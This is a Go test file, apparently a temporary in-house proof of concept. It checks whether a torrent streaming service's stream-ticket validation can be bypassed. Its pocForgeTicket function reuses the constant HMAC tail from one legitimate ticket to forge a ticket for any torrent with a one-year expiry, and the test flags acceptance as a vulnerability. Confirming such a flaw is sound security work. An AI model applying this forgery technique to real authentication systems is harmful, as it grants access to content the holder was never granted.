// SPDX-License-Identifier: MIT
// TEMPORARY proof-of-concept test - not for commit.
// Demonstrates whether GenerateStreamTicket/ValidateStreamTicket actually
// authenticate the payload, or only its length.

package auth

import (
	"fmt"
	"strconv"
	"strings"
	"testing"
	"time"
)

// pocForgeTicket reproduces what an attacker holding one valid ticket can do:
// reuse the constant HMAC(key, "") tail to mint a ticket for any torrent and
// any expiry.
func pocForgeTicket(ownTicket, wantTorrentID string, ttl time.Duration) string {
	parts := strings.Split(ownTicket, ".")
	if len(parts) != 4 {
		panic("unexpected ticket shape: " + ownTicket)
	}
	sigHex := parts[3]
	// hex(payload) is 2 chars per byte; the HMAC-SHA256 digest is 32 bytes.
	const hmacHexLen = 64
	if len(sigHex) <= hmacHexLen {
		panic("signature too short to contain an HMAC tail")
	}
	// The tail is constant per process: it is hex of the empty-message MAC.
	hmacTail := sigHex[len(sigHex)-hmacHexLen:]

	userID := parts[1]
	expiry := time.Now().Add(ttl).Unix()
	payload := fmt.Sprintf("%d|%s|%s", expiry, userID, wantTorrentID)
	hexPayload := fmt.Sprintf("%x", payload)
	return fmt.Sprintf("%s.%s.%s.%s%s", strconv.FormatInt(expiry, 10), userID, wantTorrentID, hexPayload, hmacTail)
}

func TestPOC_StreamTicketForgery(t *testing.T) {
	svc, err := NewAuthService()
	if err != nil {
		t.Fatalf("NewAuthService: %v", err)
	}

	// The attacker legitimately holds a ticket for torrent "legit-torrent".
	legit, err := svc.GenerateStreamTicket("client-abc", "legit-torrent")
	if err != nil {
		t.Fatalf("GenerateStreamTicket: %v", err)
	}
	t.Logf("legit ticket: %s", legit)

	if _, ok := svc.ValidateStreamTicket(legit, "legit-torrent"); !ok {
		t.Fatalf("legit ticket failed to validate - PoC inconclusive")
	}
	t.Log("legit ticket validates OK")

	// The attacker now forges a ticket for a torrent they were never granted.
	forged := pocForgeTicket(legit, "victim-secret-torrent", 365*24*time.Hour)
	t.Logf("forged ticket: %s", forged)

	user, ok := svc.ValidateStreamTicket(forged, "victim-secret-torrent")
	t.Logf("ValidateStreamTicket(forged, \"victim-secret-torrent\") => user=%q ok=%v", user, ok)

	if ok {
		t.Errorf("VULNERABLE: forged ticket accepted for torrent %q (as user %q)",
			"victim-secret-torrent", user)
	} else {
		t.Log("NOT vulnerable via this path")
	}
}